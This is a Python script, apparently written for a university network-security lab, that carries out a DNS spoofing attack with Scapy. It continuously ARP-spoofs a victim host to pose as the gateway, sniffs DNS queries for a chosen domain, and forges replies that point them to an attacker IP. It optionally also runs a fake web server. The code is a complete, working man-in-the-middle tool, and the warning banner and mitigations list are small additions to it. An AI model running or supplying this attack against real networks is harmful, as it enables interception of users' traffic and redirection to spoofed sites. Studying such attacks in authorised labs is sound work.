#!/usr/bin/env python3
"""
DNS SPOOFING / DNS POISONING ATTACK - Interactive Script
Autor: Edwin (2024-2415)
Institución: ITLA - Seguridad Informática

Script interactivo para DNS spoofing. Intercepta queries DNS hacia itla.edu.do
y responde con IP falsa. Incluye servidor web falso.

═══════════════════════════════════════════════════════════════════════════
CHANGELOG
═══════════════════════════════════════════════════════════════════════════
v1.0 (12 Jun 2024)
  - Versión inicial
  - DNS listener en puerto 53
  - Responde a queries de itla.edu.do con IP falsa
  - Servidor web integrado en puerto 80
  - Modo interactivo con configuración
"""

from scapy.all import *
import socket
import threading
import sys
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import datetime

# ═══════════════════════════════════════════════════════════════════════════
# FUNCIONES
# ═══════════════════════════════════════════════════════════════════════════

def print_banner():
    """Muestra banner del programa"""
    print("\n")
    print("╔════════════════════════════════════════════════════════════════════╗")
    print("║                  DNS SPOOFING / DNS POISONING                      ║")
    print("║                                                                    ║")
    print("║  Autor: Edwin (2024-2415)                                         ║")
    print("║  Institución: ITLA - Seguridad Informática                        ║")
    print("║  Demostración educativa de vulnerabilidades L3/L7                 ║")
    print("╚════════════════════════════════════════════════════════════════════╝")
    print()

def print_menu():
    """Muestra menú de opciones"""
    print("┌─ SELECCIONA MODO ──────────────────────────────────────────────┐")
    print("│                                                                │")
    print("│  [1] DNS SPOOFING (solo DNS)                                  │")
    print("│      └─ Intercepta queries y responde con IP falsa            │")
    print("│                                                                │")
    print("│  [2] DNS SPOOFING + WEB SERVER                                │")
    print("│      └─ DNS + servidor web falso en puerto 80                 │")
    print("│                                                                │")
    print("│  [0] Salir                                                     │")
    print("│                                                                │")
    print("└────────────────────────────────────────────────────────────────┘")
    print()

def get_parameters(mode):
    """Obtiene parámetros del ataque"""
    print("┌─ CONFIGURACIÓN DEL ATAQUE ─────────────────────────────────────┐")
    print("│                                                                │")
    
    target_domain = input("│ Dominio a spoolear [itla.edu.do]: ").strip()
    if not target_domain:
        target_domain = "itla.edu.do"
    
    fake_ip = input("│ IP falsa a responder [172.24.15.129]: ").strip()
    if not fake_ip:
        fake_ip = "172.24.15.129"
    
    iface = input("│ Interfaz de red [ens33]: ").strip()
    if not iface:
        iface = "ens33"
    
    if mode == '2':
        web_port = input("│ Puerto web [80]: ").strip()
        if not web_port:
            web_port = "80"
        else:
            web_port = str(web_port)
    else:
        web_port = None
    
    print("│                                                                │")
    print("└────────────────────────────────────────────────────────────────┘")
    print()
    
    return {
        'target_domain': target_domain,
        'fake_ip': fake_ip,
        'iface': iface,
        'mode': mode,
        'web_port': web_port
    }

def show_attack_info(params):
    """Muestra información del ataque"""
    if params['mode'] == '1':
        mode_name = "DNS SPOOFING (solo DNS)"
    else:
        mode_name = "DNS SPOOFING + WEB SERVER"
    
    print("┌─ INFORMACIÓN DEL ATAQUE ───────────────────────────────────────┐")
    print(f"│ Modo:              {mode_name:<39} │")
    print(f"│ Dominio objetivo:  {params['target_domain']:<39} │")
    print(f"│ IP falsa:          {params['fake_ip']:<39} │")
    print(f"│ Interfaz:          {params['iface']:<39} │")
    if params['mode'] == '2':
        print(f"│ Puerto web:        {params['web_port']:<39} │")
    print("└────────────────────────────────────────────────────────────────┘")
    print()

def confirm_attack():
    """Pide confirmación antes de ejecutar"""
    print("⚠️  ADVERTENCIA: Este script interceptará tráfico DNS.")
    print("⚠️  Solo usa en laboratorios autorizados.")
    print()
    while True:
        response = input("¿Estás seguro de continuar? (s/n): ").lower().strip()
        if response in ['s', 'si']:
            return True
        elif response in ['n', 'no']:
            return False
        else:
            print("Opción inválida. Escribe 's' o 'n'")

def create_fake_webpage(port):
    """Crea pagina web falsa"""
    html_content = """
    <html>
    <head>
        <title>ITLA - Instituto Tecnologico</title>
        <style>
            body { font-family: Arial; text-align: center; margin: 50px; background: #f0f0f0; }
            h1 { color: #d9534f; }
            p { font-size: 18px; }
            .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 20px; border-radius: 5px; }
            .info { background: #e7f3ff; border: 1px solid #2196F3; padding: 15px; border-radius: 5px; margin-top: 20px; }
        </style>
    </head>
    <body>
        <h1>Instituto Tecnologico de las Americas</h1>
        <div class="warning">
            <p><strong>FAKE PAGE - DNS SPOOFING DEMO</strong></p>
            <p>This is a fake page served by the attack server.</p>
            <p>You have been redirected due to DNS Spoofing.</p>
            <p>Server IP: 172.24.15.129</p>
            <p>Attack time: """ + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """</p>
        </div>
        <div class="info">
            <h3>Laboratory Information</h3>
            <p><strong>Student:</strong> Edwin De Paula</p>
            <p><strong>ID:</strong> 2024-2415</p>
            <p><strong>Subject:</strong> Seguridad de Redes</p>
        </div>
    </body>
    </html>
    """
    return html_content

class FakeHTTPHandler(SimpleHTTPRequestHandler):
    """Handler personalizado para servidor HTTP falso"""
    
    def do_GET(self):
        """Responde a GET requests"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = create_fake_webpage("80")
        self.wfile.write(html.encode())
    
    def log_message(self, format, *args):
        """Silencia logs del servidor"""
        print(f"[WEB] {datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]} - {format % args}")

def start_web_server(port):
    """Inicia servidor web falso"""
    try:
        server_address = ('', int(port))
        httpd = HTTPServer(server_address, FakeHTTPHandler)
        print(f"[WEB] Servidor web iniciado en puerto {port}")
        httpd.serve_forever()
    except Exception as e:
        print(f"[✗] Error en servidor web: {e}")

def dns_callback(pkt, target_domain, fake_ip):
    """Callback para procesar paquetes DNS"""
    try:
        if pkt.haslayer(DNSQR):  # DNS Query
            qname = pkt[DNSQR].qname.decode()
            
            if target_domain in qname:
                print(f"[DNS] Query recibida: {qname}")
                print(f"[DNS] Respondiendo con IP falsa: {fake_ip}")
                
                # Construir respuesta DNS
                ans = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                          an=DNSRR(rrname=qname, ttl=10, rdata=fake_ip))
                
                send(ans, verbose=False)
                print(f"[✓] Respuesta enviada a {pkt[IP].src}")
                print()
    except Exception as e:
        print(f"[!] Error procesando paquete: {e}")

def arp_spoof(target_ip, spoof_ip, iface):
    """ARP spoofing para interceptar tráfico como gateway"""
    target_mac = getmacbyip(target_ip)
    attacker_mac = get_if_hwaddr(iface)
    
    # Crear paquete ARP falso
    arp_pkt = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    try:
        send(arp_pkt, iface=iface, verbose=False)
        print(f"[ARP] Spoofing: {target_ip} → {spoof_ip} (MAC: {attacker_mac})")
    except Exception as e:
        print(f"[✗] Error en ARP spoof: {e}")

def execute_attack(params):
    """Ejecuta el ataque DNS con ARP spoofing"""
    print("\n" + "="*70)
    print("EJECUTANDO: DNS SPOOFING + ARP SPOOFING ATTACK")
    print("="*70)
    print()
    
    gateway = "172.24.15.15"
    victim_ip = "172.24.15.50"
    parrot_ip = "172.24.15.129"
    
    print(f"[*] Configuración:")
    print(f"    Gateway: {gateway}")
    print(f"    Victim: {victim_ip}")
    print(f"    Parrot (Atacante): {parrot_ip}")
    print()
    
    if params['mode'] == '2':
        print("[*] Iniciando servidor web en background...")
        web_thread = threading.Thread(
            target=start_web_server,
            args=(params['web_port'],),
            daemon=True
        )
        web_thread.start()
        print()
    
    print("[*] Iniciando ARP spoofing (Parrot se hace pasar por gateway)...")
    print("[*] Iniciando DNS sniffer en puerto 53...")
    print(f"[*] Buscando queries hacia: {params['target_domain']}")
    print(f"[*] Respondiendo con: {params['fake_ip']}")
    print()
    print("Presiona Ctrl+C para detener el ataque")
    print()
    
    # Thread para ARP spoofing continuo
    def continuous_arp():
        while True:
            try:
                arp_spoof(victim_ip, gateway, params['iface'])
                time.sleep(1)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Error ARP: {e}")
    
    arp_thread = threading.Thread(target=continuous_arp, daemon=True)
    arp_thread.start()
    
    try:
        sniff(
            prn=lambda pkt: dns_callback(pkt, params['target_domain'], params['fake_ip']),
            filter="udp port 53",
            iface=params['iface'],
            store=False
        )
    except KeyboardInterrupt:
        print("\n\n[!] Ataque detenido por usuario")
        print()
    except PermissionError:
        print("[✗] Error: Se requieren permisos de root (sudo)")
        print()
    except Exception as e:
        print(f"[✗] Error: {e}")
        print()

def show_mitigation():
    """Muestra mitigaciones contra DNS Spoofing"""
    print("\n" + "="*70)
    print("MITIGACIONES CONTRA DNS SPOOFING")
    print("="*70)
    print()
    
    mitigations = [
        ("DNSSEC", "Valida respuestas DNS con firmas criptográficas"),
        ("DNS over HTTPS", "Encripta queries DNS en HTTPS"),
        ("DNS Filtering", "Filtra domains sospechosas o maliciosas"),
        ("ARP Protection", "Previene ARP spoofing (complementario)"),
        ("Network Monitoring", "Detecta cambios anómalos de DNS"),
    ]
    
    for i, (nombre, descripcion) in enumerate(mitigations, 1):
        print(f"  {i}. {nombre}")
        print(f"     └─ {descripcion}")
        print()

def main():
    """Programa principal"""
    while True:
        print_banner()
        print_menu()
        
        choice = input("Opción: ").strip()
        
        if choice == '0':
            print("Saliendo...")
            print()
            sys.exit(0)
        
        if choice not in ['1', '2']:
            print("[✗] Opción inválida. Intenta de nuevo.")
            print()
            input("Presiona ENTER para continuar...")
            print("\033c", end="")
            continue
        
        params = get_parameters(choice)
        
        show_attack_info(params)
        
        if not confirm_attack():
            print("Ataque cancelado.")
            print()
            input("Presiona ENTER para continuar...")
            print("\033c", end="")
            continue
        
        execute_attack(params)
        
        show_mitigation()
        
        input("Presiona ENTER para volver al menú...")
        print("\033c", end="")

# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrumpido por usuario.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[✗] Error fatal: {e}")
        sys.exit(1)
